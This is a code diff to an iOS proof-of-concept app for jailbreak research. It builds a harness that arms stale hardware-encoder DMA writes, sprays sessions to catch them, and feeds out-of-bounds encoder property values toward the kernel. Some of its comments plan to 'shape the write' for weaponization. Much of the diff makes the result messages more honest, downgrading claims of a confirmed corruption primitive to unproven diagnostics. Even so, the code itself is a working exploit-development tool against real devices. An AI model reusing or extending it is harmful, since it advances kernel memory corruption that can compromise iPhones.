@@ -4382,18 +4893,35 @@ static void runDPrep2(void) {
                          trainBS.count, baseMaxLen, inv, 100.0 * inv / baseMaxLen);
                     os_log(dLog, "JBPoC-DPREP2v4-ENVELOPE train=%zu len=%zu inv=%d",
                            trainBS.count, baseMaxLen, inv);
+                    }
                 }
-            } else if (elapsed > DPREP2_TRAIN_CUTOFF_S && elapsed < DPREP2_TEST_START_S) {
-                // GAP: keep encoding to maintain frame cadence, but don't analyze
-                INFO(@"T+%03ds (%@): GAP frame %d (%zu bytes)",
-                     elapsed, now, frameNum - 1, curBS ? curBS.length : 0);
             } else if (elapsed >= DPREP2_TEST_START_S && curBS && curBS.length > 0) {
-                // TEST PHASE: T+60s+ — diff against envelope
+                // TEST PHASE: T+60s+ — diff against envelope + Q4 firmware metadata
                 const uint8_t *cur = curBS.bytes;
                 int anomalies = 0;
                 int firstAnom = -1;
 
-                // PRIMARY SIGNAL: variance envelope check (byte-level anomaly detection)
+                // PRIMARY SIGNAL (Q4): firmware metadata at coded-output offsets
+                BOOL fwMetaHit = NO;
+                uint32_t fwFrame = 0, fwSize = 0;
+                if (curBS.length > DP2_FW_SIZE_OFFSET + 4) {
+                    memcpy(&fwFrame, cur + DP2_FW_FRAME_OFFSET, 4);
+                    memcpy(&fwSize, cur + DP2_FW_SIZE_OFFSET, 4);
+                    // Armed encode was frame 0 on trigger session. If we see
+                    // stale frame# in obs session output, DMA crossed sessions.
+                    if (fwFrame == 0 && tick > 2) {
+                        fwMetaHit = YES;
+                        PASS(@"*** Q4 PRIMARY HIT: frame# at +0xa8 = %u (armed frame!) ***",
+                             fwFrame);
+                    }
+                    if (fwSize > 0 && (fwSize > baseMaxLen * 4 || fwSize < 16)) {
+                        fwMetaHit = YES;
+                        PASS(@"*** Q4 SIZE HIT: coded_size at +0xac = %u (baseline max=%zu) ***",
+                             fwSize, baseMaxLen);
+                    }
+                }
+
+                // SECONDARY SIGNAL: variance envelope check
                 if (varMin && varMax) {
                     size_t len = MIN(curBS.length, baseMaxLen);
                     for (size_t j = 0; j < len; j++) {
@@ -4404,41 +4932,43 @@ static void runDPrep2(void) {
                     }
                 }
 
-                // SECONDARY SIGNAL: size anomaly vs training
+                // TERTIARY SIGNAL: +0x1270 region byte deviation
+                int bsRegionAnoms = 0;
+                if (varMin && varMax && curBS.length > DP2_FW_BS_OFFSET) {
+                    size_t len = MIN(curBS.length, baseMaxLen);
+                    size_t bsEnd = MIN(len, (size_t)(DP2_FW_BS_OFFSET + DP2_FW_BS_COPY_LEN));
+                    for (size_t j = DP2_FW_BS_OFFSET; j < bsEnd; j++) {
+                        if (cur[j] < varMin[j] || cur[j] > varMax[j]) {
+                            bsRegionAnoms++;
+                        }
+                    }
+                }
+
+                // Size anomaly: flag only lengths OUTSIDE the training
+                // [min,max] range. Legal frame-to-frame variance must not
+                // count as a "hit" (old check fired on ANY length difference).
                 BOOL sizeAnom = NO;
-                for (NSData *tbs in trainBS) {
-                    if (tbs.length > 0 && curBS.length != tbs.length) {
-                        sizeAnom = YES;
-                        break;
+                {
+                    NSUInteger tMin = NSUIntegerMax, tMax = 0;
+                    for (NSData *tbs in trainBS) {
+                        if (tbs.length < tMin) tMin = tbs.length;
+                        if (tbs.length > tMax) tMax = tbs.length;
                     }
+                    if (tMin != NSUIntegerMax)
+                        sizeAnom = (curBS.length < tMin || curBS.length > tMax);
                 }
 
-                // SPECULATIVE SIGNAL: firmware DMA buffer layout offsets
-                // NOTE: these offsets (0xa8, 0xac) are from the firmware's DMA
-                // output surface layout, NOT the compressed bitstream format.
-                // A hit here is suggestive but the offsets may not align with
-                // the VT callback bitstream. Only check if bitstream is long enough.
-                uint32_t fwFrame = 0, fwSize = 0;
-                BOOL fwMetaHit = NO;
-                if (curBS.length > DP2_FW_SIZE_OFFSET + 4) {
-                    memcpy(&fwFrame, cur + DP2_FW_FRAME_OFFSET, 4);
-                    memcpy(&fwSize, cur + DP2_FW_SIZE_OFFSET, 4);
-                    if (fwFrame == 0 && tick > 2) {
-                        fwMetaHit = YES;
-                    }
-                    if (fwSize > 0 && (fwSize > baseMaxLen * 4 || fwSize < 16)) {
-                        fwMetaHit = YES;
-                    }
-                }
-
-                if (anomalies > 0 || sizeAnom || fwMetaHit) {
+                if (fwMetaHit || anomalies > 0 || sizeAnom) {
                     hitCount++;
                     if (firstHitTime < 0) firstHitTime = elapsed;
-                    PASS(@"*** HIT at T+%ds (%@): %d envelope anomalies%@%@ ***",
-                         elapsed, now, anomalies,
+                    INFO(@"*** ANOMALY (diagnostic) at T+%ds (%@): %d envelope, %d +0x1270-region, "
+                         @"fw_frame=%u fw_size=%u%@%@ ***",
+                         elapsed, now, anomalies, bsRegionAnoms,
+                         fwFrame, fwSize,
                          sizeAnom ? @" SIZE_CHANGE" : @"",
-                         fwMetaHit ? @" FW_SPECULATIVE" : @"");
+                         fwMetaHit ? @" FW_META_HIT" : @"");
 
+                    // Dump first 32 anomalies
                     if (varMin && varMax) {
                         NSMutableString *hex = [NSMutableString string];
                         int dumped = 0;
@@ -4454,7 +4984,8 @@ static void runDPrep2(void) {
                         LOG(@"  Envelope anomalies: %@", hex);
                     }
 
-                    if (fwMetaHit && curBS.length > DP2_FW_SIZE_OFFSET + 4) {
+                    // Dump firmware metadata region
+                    if (curBS.length > DP2_FW_SIZE_OFFSET + 4) {
                         NSMutableString *fwHex = [NSMutableString string];
                         size_t fwStart = DP2_FW_FRAME_OFFSET;
                         size_t fwEnd = MIN(curBS.length, (size_t)(DP2_FW_SIZE_OFFSET + 8));
@@ -4462,13 +4993,13 @@ static void runDPrep2(void) {
                             [fwHex appendFormat:@"%02x", cur[j]];
                             if ((j - fwStart + 1) % 4 == 0) [fwHex appendString:@" "];
                         }
-                        LOG(@"  FW DMA offsets (speculative, +0xa8..+0xb4): %@", fwHex);
+                        LOG(@"  FW metadata (+0xa8..+0xb4): %@", fwHex);
                     }
 
                     [hitReport appendFormat:
-                        @"T+%ds: env=%d fw_frame=%u fw_size=%u%s%s\n",
-                        elapsed, anomalies, fwFrame, fwSize,
-                        sizeAnom ? " SIZE" : "", fwMetaHit ? " FW_SPEC" : ""];
+                        @"T+%ds: env=%d bs_region=%d fw_frame=%u fw_size=%u%s%s\n",
+                        elapsed, anomalies, bsRegionAnoms, fwFrame, fwSize,
+                        sizeAnom ? " SIZE" : "", fwMetaHit ? " FW_META" : ""];
 
                     os_log(dLog, "JBPoC-DPREP2v4-HIT T+%ds env=%d bs=%d fwF=%u fwS=%u meta=%d",
                            elapsed, anomalies, bsRegionAnoms, fwFrame, fwSize, (int)fwMetaHit);
@@ -4523,7 +5054,7 @@ static void runDPrep2(void) {
             if (inDiffs > 0) {
                 hitCount++;
                 if (firstHitTime < 0) firstHitTime = elapsed;
-                PASS(@"*** INPUT HIT at T+%ds: %d bytes ***", elapsed, inDiffs);
+                INFO(@"*** INPUT BYTES CHANGED (diagnostic) at T+%ds: %d bytes ***", elapsed, inDiffs);
                 memcpy(inputSnap, curY, ySize);
                 memcpy(inputSnap + ySize, curUV, uvSize);
             }
@@ -4535,11 +5066,10 @@ static void runDPrep2(void) {
     pocLog(@"");
     LOG(@"═══════════════════════════════════════════════");
     if (hitCount > 0) {
-        PASS(@"*** MODEL (b) CONFIRMED — keep-alive output readout! ***");
-        LOG(@"Stale DMA write detected while session PTEs are valid!");
-        LOG(@"Total hits: %d, first at T+%ds post-arm", hitCount, firstHitTime);
-        LOG(@"The write succeeds harmlessly into the still-mapped buffer.");
-        LOG(@"Primitive = arm + keep-alive + read output. Mode A likely unnecessary.");
+        PASS(@"*** OUTPUT ANOMALY OBSERVED — DIAGNOSTIC ONLY ***");
+        LOG(@"Hits: %d, first at T+%ds post-arm. Envelope/size/metadata are", hitCount, firstHitTime);
+        LOG(@"anomaly detectors, NOT proof of unauthorized memory access.");
+        LOG(@"Corruption unproven until verified vs legal-value control runs.");
         os_log(dLog, "JBPoC-DPREP2v4-RESULT MODEL_B hits=%d firstAt=%d", hitCount, firstHitTime);
     } else {
         INFO(@"No anomalies in bitstream or input over 240s.");
@@ -4586,8 +5116,9 @@ static void runDPrep2(void) {
         g_dp2ObsRejectCount, hitCount, firstHitTime, hitReport];
     NSString *resultPath = [NSHomeDirectory()
         stringByAppendingPathComponent:@"Documents/dprep2_result.txt"];
-    [resultStr writeToFile:resultPath atomically:YES
-                  encoding:NSUTF8StringEncoding error:nil];
+    if (![resultStr writeToFile:resultPath atomically:YES
+                       encoding:NSUTF8StringEncoding error:nil])
+        FAIL(@"dprep2 result write FAILED — record preserved only in live log");
     INFO(@"Results written to %@", resultPath);
 
     // NO INVALIDATION — let the fire come on its own timing.
@@ -4619,9 +5150,6 @@ static void runDPrep2(void) {
     // Archive intentionally NOT freed — retained for post-panic recovery
     // dp2FreeArchive() would destroy the evidence
     // Intentionally NOT releasing trigger/obs sessions, pb — keep PTEs alive
-    dispatch_async(dispatch_get_main_queue(), ^{
-        [UIApplication sharedApplication].idleTimerDisabled = NO;
-    });
     g_phase2Running = NO;
 
     PASS(@"D-PREP-2 readout complete. Archive: %d samples retained.", g_dp2ArchiveIdx);
@@ -4657,9 +5185,9 @@ static void runDPrep2(void) {
 #define EXP3_SOAK_SECS       300
 #define EXP3_UNCOVER_SECS    180
 
-static volatile BOOL g_exp3Armed = NO;
-static volatile int g_exp3EncodeStatus = 0;
-static volatile BOOL g_exp3Running = NO;
+static _Atomic BOOL g_exp3Armed = NO;
+static _Atomic int g_exp3EncodeStatus = 0;
+static _Atomic BOOL g_exp3Running = NO;
 
 static void exp3Mark(NSString *phase) {
     NSString *p = [NSHomeDirectory()
@@ -4676,7 +5204,7 @@ static void exp3ArmCallback(
     if (status != noErr && !sampleBuffer) {
         g_exp3Armed = YES;
         if (status == -17691) {
-            PASS(@"[Exp3] -17691 — classic arm, firmware DMA is armed!");
+            PASS(@"[Exp3] -17691 — classic arm signature (DMA-armed is hypothesis)");
         } else {
             PASS(@"[Exp3] %d — alternate arm signature, continuing", (int)status);
         }
@@ -4690,8 +5218,8 @@ static void exp3ArmCallback(
 // Baseline/clone output collection
 #define EXP3_MAX_SAMPLES 256
 static CMSampleBufferRef g_exp3Samples[EXP3_MAX_SAMPLES];
-static volatile int g_exp3SampleCount = 0;
-static volatile int g_exp3SampleErrors = 0;
+static _Atomic int g_exp3SampleCount = 0;
+static _Atomic int g_exp3SampleErrors = 0;
 
 static void exp3CollectCallback(
     void *ctx, void *sourceFrameRefCon, OSStatus status,
@@ -4701,10 +5229,14 @@ static void exp3CollectCallback(
         INFO(@"[Exp3] Collect callback error: %d", (int)status);
         return;
     }
-    if (sampleBuffer && g_exp3SampleCount < EXP3_MAX_SAMPLES) {
-        CFRetain(sampleBuffer);
-        g_exp3Samples[g_exp3SampleCount] = sampleBuffer;
-        g_exp3SampleCount++;
+    if (sampleBuffer) {
+        dispatch_sync(jbExp3Queue(), ^{
+            if (g_exp3SampleCount < EXP3_MAX_SAMPLES) {
+                CFRetain(sampleBuffer);
+                g_exp3Samples[g_exp3SampleCount] = sampleBuffer;
+                g_exp3SampleCount++;
+            }
+        });
     }
 }
 
@@ -4715,19 +5247,25 @@ static NSData *exp3GetBitstreamData(CMSampleBufferRef sbuf) {
     size_t len = CMBlockBufferGetDataLength(block);
     if (len == 0) return nil;
     NSMutableData *data = [NSMutableData dataWithLength:len];
-    CMBlockBufferCopyDataBytes(block, 0, len, data.mutableBytes);
+    OSStatus cbStat = CMBlockBufferCopyDataBytes(block, 0, len, data.mutableBytes);
+    if (cbStat != noErr) {
+        INFO(@"bitstream copy failed (%d) — sample dropped", (int)cbStat);
+        return nil;
+    }
     return data;
 }
 
 static void exp3FreeSamples(void) {
-    for (int i = 0; i < g_exp3SampleCount; i++) {
-        if (g_exp3Samples[i]) {
-            CFRelease(g_exp3Samples[i]);
-            g_exp3Samples[i] = NULL;
+    dispatch_sync(jbExp3Queue(), ^{
+        for (int i = 0; i < g_exp3SampleCount; i++) {
+            if (g_exp3Samples[i]) {
+                CFRelease(g_exp3Samples[i]);
+                g_exp3Samples[i] = NULL;
+            }
         }
-    }
-    g_exp3SampleCount = 0;
-    g_exp3SampleErrors = 0;
+        g_exp3SampleCount = 0;
+        g_exp3SampleErrors = 0;
+    });
 }
 
 static VTCompressionSessionRef exp3CreateSessionEx(
@@ -5038,7 +5576,7 @@ static void runExp3_ModeA(void) {
         }
     }
 
-    PASS(@"*** SOAK SURVIVED T+%ds — stale DMA likely absorbed ***", EXP3_SOAK_SECS);
+    INFO(@"*** SOAK WINDOW COMPLETE T+%ds — no panic observed this run ***", EXP3_SOAK_SECS);
     os_log(eLog, "JBPoC-EXP3 PHASE5 SOAK_SURVIVED sprays=%d", sprayCount);
     exp3Mark(@"P5-SOAK-SURVIVED");
 
@@ -5069,20 +5607,19 @@ static void runExp3_ModeA(void) {
         }
     }
 
-    PASS(@"*** UNCOVER SURVIVED — single fire event absorbed ***");
+    INFO(@"*** UNCOVER WINDOW COMPLETE — no panic observed this run ***");
     os_log(eLog, "JBPoC-EXP3 PHASE6 UNCOVER_SURVIVED");
     exp3Mark(@"P6-UNCOVER-SURVIVED");
 
     // ---- RESULTS ----
     pocLog(@"");
     LOG(@"═══════════════════════════════════════════════");
-    PASS(@"*** MODE A3: FULL SURVIVAL ***");
-    LOG(@"Soak survived: stale DMA absorbed by spray sessions.");
-    LOG(@"Uncover survived: single fire event, already absorbed.");
+    INFO(@"*** MODE A3: SURVIVED SOAK + UNCOVER (no panic observed) ***");
+    LOG(@"Consistent with absorption — does NOT prove a write occurred.");
+    LOG(@"A silent write is only shown by diffing surfaced bytes; unverified.");
     LOG(@"Spray: %d thin + %d fat sessions.", thinCount, fatCount);
     pocLog(@"");
-    LOG(@"CONFIRMED: spray PTE coverage captured the stale write.");
-    LOG(@"The hardware DMA write primitive is tamed.");
+    LOG(@"Allowed claim: 'no panic during soak+uncover this run'. Nothing stronger.");
     pocLog(@"");
     LOG(@"Next: add output buffer scan to locate WHERE the write landed,");
     LOG(@"shape the write (control DVA offset + written data),");
@@ -5098,8 +5635,9 @@ static void runExp3_ModeA(void) {
         EXP3_SOAK_SECS, EXP3_UNCOVER_SECS, baselineCount];
     NSString *resultPath = [NSHomeDirectory()
         stringByAppendingPathComponent:@"Documents/exp3_result.txt"];
-    [resultStr writeToFile:resultPath atomically:YES
-                  encoding:NSUTF8StringEncoding error:nil];
+    if (![resultStr writeToFile:resultPath atomically:YES
+                       encoding:NSUTF8StringEncoding error:nil])
+        FAIL(@"exp3 result write FAILED — record preserved only in live log");
     INFO(@"Results written to %@", resultPath);
 
     exp3FreeSamples();
@@ -5255,7 +5793,7 @@ static void runExp4_CoTenancy(void) {
         return;
     }
     exp3Mark(@"A4-P2-armed");
-    PASS(@"Armed — -17691 confirmed. Stale DMA descriptor loaded.");
+    PASS(@"-17691 error path confirmed. Stale DMA descriptor: HYPOTHESIS, not directly verified.");
 
     // ---- PHASE 3: FREE ARM ONLY (buddies stay alive) ----
     exp3Mark(@"A4-P3-free-arm-only");
@@ -5302,7 +5840,7 @@ static void runExp4_CoTenancy(void) {
         }
     }
 
-    PASS(@"*** A4 SOAK SURVIVED T+%d — buddy may have absorbed write ***", A4_SOAK_SECS);
+    INFO(@"*** A4 SOAK WINDOW COMPLETE T+%d — no panic observed this run ***", A4_SOAK_SECS);
     os_log(aLog, "A4 PHASE4 SOAK_SURVIVED buddies=%d", buddyCount);
     exp3Mark(@"A4-SOAK-SURVIVED");
 
@@ -5328,16 +5866,15 @@ static void runExp4_CoTenancy(void) {
         INFO(@"T+%03ds: alive post-teardown", elapsed);
     }
 
-    PASS(@"*** A4 POST-SOAK SURVIVED — single fire, buddy absorbed ***");
+    INFO(@"*** A4 POST-SOAK COMPLETE — no panic observed (absorbed vs never-fired unresolved) ***");
     exp3Mark(@"A4-POST-SOAK-SURVIVED");
 
     // ---- RESULTS ----
     pocLog(@"");
     LOG(@"═══════════════════════════════════════════════");
-    PASS(@"*** MODE A4: FULL SURVIVAL — CORRUPTION PRIMITIVE ***");
-    LOG(@"Co-tenancy confirmed: buddy session kept PTE valid.");
-    LOG(@"Stale DMA wrote into buddy's chunk without panic.");
-    LOG(@"PANIC → CORRUPTION primitive conversion achieved.");
+    INFO(@"*** MODE A4: FULL SURVIVAL (absorbed-or-never-fired unproven) ***");
+    LOG(@"No panic observed. To claim corruption, re-run with a buddy-output");
+    LOG(@"snapshot before and after the soak and diff the bytes. Unverified.");
     pocLog(@"");
     LOG(@"Next: scan buddy output buffers for corruption,");
     LOG(@"vary buddy count to control which offset catches the write,");
@@ -5351,8 +5888,9 @@ static void runExp4_CoTenancy(void) {
         [NSDate date], buddyCount, A4_SOAK_SECS, A4_POST_SOAK_SECS];
     NSString *resultPath = [NSHomeDirectory()
         stringByAppendingPathComponent:@"Documents/a4_result.txt"];
-    [resultStr writeToFile:resultPath atomically:YES
-                  encoding:NSUTF8StringEncoding error:nil];
+    if (![resultStr writeToFile:resultPath atomically:YES
+                       encoding:NSUTF8StringEncoding error:nil])
+        FAIL(@"a4 result write FAILED — record preserved only in live log");
 
     exp3FreeSamples();
 
@@ -5367,21 +5905,7 @@ static void runExp4_CoTenancy(void) {
 }
 
 // ============================================================
-// MODE A5: PIVOTAL FORK — fire with session alive (no free)
-//
-// QUESTION: does the deferred DMA write escape the session's
-// own mapped pages? If yes → adjacent-page groom (easy path).
-// If no → write is in-bounds, need DVA recycle (hard path).
-//
-// Corpus evidence: panics 1, 2, 8 (Run C) fired with session
-// alive — hit PTE 0x1fb/0x1c4 (not the freed-session 0x20b).
-// But those were early code. This is the clean confirmation.
-//
-// ORACLE:
-//   panic  → fire escapes session; targets stale/adjacent pages
-//            even while session is alive. Groom victim next to arm.
-//   survive → fire only targets session's own pages (DMA in-bounds).
-//            weaponization needs DVA recycle to remap target page.
+// Mode A5: PIVOTAL FORK — Keep session alive, see if fire hits
 // ============================================================
 
 #define A5_SOAK_SECS 300
@@ -5941,7 +6465,6 @@ static void runStage1_DartRead(void) {
                 os_log(sLog, "STAGE1 SPRAY-HIT session=%d T+%d diffs=%d first=0x%x",
                        i, elapsed, diffs, firstOff);
 
-                // Dump first 128 changed bytes
                 CVPixelBufferLockBaseAddress(sprayPBs[i], kCVPixelBufferLock_ReadOnly);
                 uint8_t *cur = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(sprayPBs[i], 0);
                 NSMutableString *hex = [NSMutableString string];
@@ -5955,7 +6478,6 @@ static void runStage1_DartRead(void) {
                 CVPixelBufferUnlockBaseAddress(sprayPBs[i], kCVPixelBufferLock_ReadOnly);
                 LOG(@"  Diff: %@", hex);
 
-                // Full dump to file
                 CVPixelBufferLockBaseAddress(sprayPBs[i], kCVPixelBufferLock_ReadOnly);
                 uint8_t *dumpBase = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(sprayPBs[i], 0);
                 if (dumpBase) {
@@ -5969,7 +6491,6 @@ static void runStage1_DartRead(void) {
                 }
                 CVPixelBufferUnlockBaseAddress(sprayPBs[i], kCVPixelBufferLock_ReadOnly);
 
-                // Update snapshot for incremental tracking
                 CVPixelBufferLockBaseAddress(sprayPBs[i], kCVPixelBufferLock_ReadOnly);
                 uint8_t *updY = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(sprayPBs[i], 0);
                 if (updY) memcpy(spraySnapshots[i], updY, MIN(yTotal, spraySizes[i]));
@@ -6154,7 +6675,7 @@ static void runTier1bOOB(void) {
         INFO(@"Readback: AlphaLayerID = %@", (__bridge id)readBack);
         int val = [(__bridge NSNumber *)readBack intValue];
         if (val == 64) {
-            PASS(@"Value NOT clamped — 64 will reach the kernel!");
+            PASS(@"Value NOT clamped — 64 stored in session (kernel delivery unproven)");
         } else {
             INFO(@"Value was clamped to %d — kernel may not see 64", val);
         }
@@ -6265,7 +6786,7 @@ static void runTier1bOOB(void) {
         INFO(@"Readback: RepFormatIndex = %@", (__bridge id)readBack);
         int val = [(__bridge NSNumber *)readBack intValue];
         if (val == 10) {
-            PASS(@"Value NOT clamped — 10 will reach the kernel!");
+            PASS(@"Value NOT clamped — 10 stored in session (kernel delivery unproven)");
         } else {
             INFO(@"Value was clamped to %d", val);
         }
@@ -6428,7 +6949,7 @@ static void runTier2Probe(void) {
 // ============================================================
 
 @interface AppDelegate : UIResponder <UIApplicationDelegate>
-@property (strong) UIWindow *window;
+@property (nullable, nonatomic, strong) UIWindow *window;
 @end
 
 @interface PoCViewController : UIViewController
@@ -6678,36 +7199,36 @@ static void runTier2Probe(void) {
     [dPrep2Btn addTarget:self action:@selector(runDPrep2) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:dPrep2Btn];
 
-    // Experiment row 10: A3 + A4 + A5 (three buttons)
+    // Experiment row 10: A3 spray + A4 co-tenancy + A5 no-free (three buttons)
     CGFloat row10 = row9 + btnH + gap;
-    CGFloat expBtnW3 = (w - pad * 2 - gap * 2) / 3;
+    CGFloat expBtnW = (w - pad * 2 - gap * 2) / 3;
 
     UIButton *exp3Btn = [UIButton buttonWithType:UIButtonTypeSystem];
-    exp3Btn.frame = CGRectMake(pad, row10, expBtnW3, btnH);
+    exp3Btn.frame = CGRectMake(pad, row10, expBtnW, btnH);
     exp3Btn.backgroundColor = [UIColor colorWithRed:0.4 green:0.3 blue:0.0 alpha:1];
     exp3Btn.layer.cornerRadius = 8;
     exp3Btn.layer.borderWidth = 2;
     exp3Btn.layer.borderColor = [UIColor colorWithRed:1.0 green:0.8 blue:0.0 alpha:1].CGColor;
-    exp3Btn.titleLabel.font = [UIFont boldSystemFontOfSize:10];
-    [exp3Btn setTitle:@"A3: Spray" forState:UIControlStateNormal];
+    exp3Btn.titleLabel.font = [UIFont boldSystemFontOfSize:11];
+    [exp3Btn setTitle:@"A3: PTE Spray" forState:UIControlStateNormal];
     [exp3Btn setTitleColor:[UIColor colorWithRed:1.0 green:0.8 blue:0.0 alpha:1] forState:UIControlStateNormal];
     [exp3Btn addTarget:self action:@selector(runExp3) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:exp3Btn];
 
     UIButton *a4Btn = [UIButton buttonWithType:UIButtonTypeSystem];
-    a4Btn.frame = CGRectMake(pad + expBtnW3 + gap, row10, expBtnW3, btnH);
+    a4Btn.frame = CGRectMake(pad + expBtnW + gap, row10, expBtnW, btnH);
     a4Btn.backgroundColor = [UIColor colorWithRed:0.5 green:0.0 blue:0.3 alpha:1];
     a4Btn.layer.cornerRadius = 8;
     a4Btn.layer.borderWidth = 2;
     a4Btn.layer.borderColor = [UIColor colorWithRed:1.0 green:0.2 blue:0.8 alpha:1].CGColor;
-    a4Btn.titleLabel.font = [UIFont boldSystemFontOfSize:10];
-    [a4Btn setTitle:@"A4: CoTen" forState:UIControlStateNormal];
+    a4Btn.titleLabel.font = [UIFont boldSystemFontOfSize:11];
+    [a4Btn setTitle:@"A4: Co-Tenant" forState:UIControlStateNormal];
     [a4Btn setTitleColor:[UIColor colorWithRed:1.0 green:0.2 blue:0.8 alpha:1] forState:UIControlStateNormal];
     [a4Btn addTarget:self action:@selector(runA4CoTenancy) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:a4Btn];
 
     UIButton *a5Btn = [UIButton buttonWithType:UIButtonTypeSystem];
-    a5Btn.frame = CGRectMake(pad + (expBtnW3 + gap) * 2, row10, expBtnW3, btnH);
+    a5Btn.frame = CGRectMake(pad + (expBtnW + gap) * 2, row10, expBtnW, btnH);
     a5Btn.backgroundColor = [UIColor colorWithRed:0.0 green:0.3 blue:0.5 alpha:1];
     a5Btn.layer.cornerRadius = 8;
     a5Btn.layer.borderWidth = 2;
@@ -6752,63 +7273,65 @@ static void runTier2Probe(void) {
 }
 
 - (void)runChroot {
-    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+    jbDispatch(@"runChrootPoC", ^{
         runChrootPoC();
     });
 }
 
 - (void)runAVE2 {
-    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+    jbDispatch(@"runAVE2PoC", ^{
         runAVE2PoC();
     });
 }
 
 - (void)runPropDump {
-    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+    jbDispatch(@"runPropertyDump", ^{
         runPropertyDump();
     });
 }
 
 - (void)runTier1 {
-    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+    jbDispatch(@"runTier1OOB", ^{
         runTier1OOB();
     });
 }
 
 - (void)runVerify {
-    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+    jbDispatch(@"runVerifyAndTrigger", ^{
         runVerifyAndTrigger();
     });
 }
 
 - (void)runTier1b {
-    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+    jbDispatch(@"runTier1bOOB", ^{
         runTier1bOOB();
     });
 }
 
 - (void)runEscalate {
-    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+    jbDispatch(@"runEscalation", ^{
         runEscalation();
     });
 }
 
 - (void)runNarrow {
-    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+    jbDispatch(@"runNarrowPanic", ^{
         runNarrowPanic();
     });
 }
 
 - (void)runTier2 {
-    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+    jbDispatch(@"runTier2Probe", ^{
         runTier2Probe();
     });
 }
 
 - (void)runBoth {
-    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        runChrootPoC();
+    jbDispatch(@"runBoth", ^{
+        // Encoder tests FIRST: chroot(2) mutates process state (chroot root,
+        // cwd) for anything that runs after it in this process.
         runAVE2PoC();
+        runChrootPoC();
         pocLog(@"");
         pocLog(@"════════════════════════════════════");
         pocLog(@"  ALL PoCs COMPLETE");
@@ -6819,85 +7342,85 @@ static void runTier2Probe(void) {
 }
 
 - (void)runIdleWait {
-    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+    jbDispatch(@"runPhase2_IdleWait", ^{
         runPhase2_IdleWait();
     });
 }
 
 - (void)runTruncation {
-    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+    jbDispatch(@"runPhase2_Truncation", ^{
         runPhase2_Truncation();
     });
 }
 
 - (void)runBoundary {
-    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+    jbDispatch(@"runPhase2_Boundary", ^{
         runPhase2_Boundary();
     });
 }
 
 - (void)runTeardown {
-    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+    jbDispatch(@"runPhase2_Teardown", ^{
         runPhase2_Teardown();
     });
 }
 
 - (void)runRunBv2 {
-    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+    jbDispatch(@"runRunB_v2", ^{
         runRunB_v2();
     });
 }
 
 - (void)runRunC1 {
-    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+    jbDispatch(@"runRunC1", ^{
         runRunC1();
     });
 }
 
 - (void)runDPrep {
-    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+    jbDispatch(@"runDPrep", ^{
         runDPrep();
     });
 }
 
 - (void)runDPrep2 {
-    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+    jbDispatch(@"runDPrep2", ^{
         runDPrep2();
     });
 }
 
 - (void)runRunC2 {
-    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+    jbDispatch(@"runRunC2", ^{
         runRunC2();
     });
 }
 
 - (void)runC2EarlyKill {
-    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+    jbDispatch(@"runC2EarlyKill", ^{
         runC2EarlyKill();
     });
 }
 
 - (void)runExp3 {
-    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+    jbDispatch(@"runExp3_ModeA", ^{
         runExp3_ModeA();
     });
 }
 
 - (void)runA4CoTenancy {
-    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+    jbDispatch(@"runExp4_CoTenancy", ^{
         runExp4_CoTenancy();
     });
 }
 
 - (void)runA5PivotalFork {
-    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+    jbDispatch(@"runExp5_PivotalFork", ^{
         runExp5_PivotalFork();
     });
 }
 
 - (void)runStage1 {
-    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+    jbDispatch(@"runStage1_DartRead", ^{
         runStage1_DartRead();
     });
 }
@@ -6908,6 +7431,7 @@ static void runTier2Probe(void) {
 - (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
     self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
     self.window.rootViewController = [PoCViewController new];
+    resolvePanicJournal();
     [self.window makeKeyAndVisible];
     return YES;
 }
@@ -6918,6 +7442,7 @@ int main(int argc, char *argv[]) {
         return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
     }
 }
+
 OBJC
 
 echo "  main.m written ($(wc -l < "$WORK/main.m") lines)"
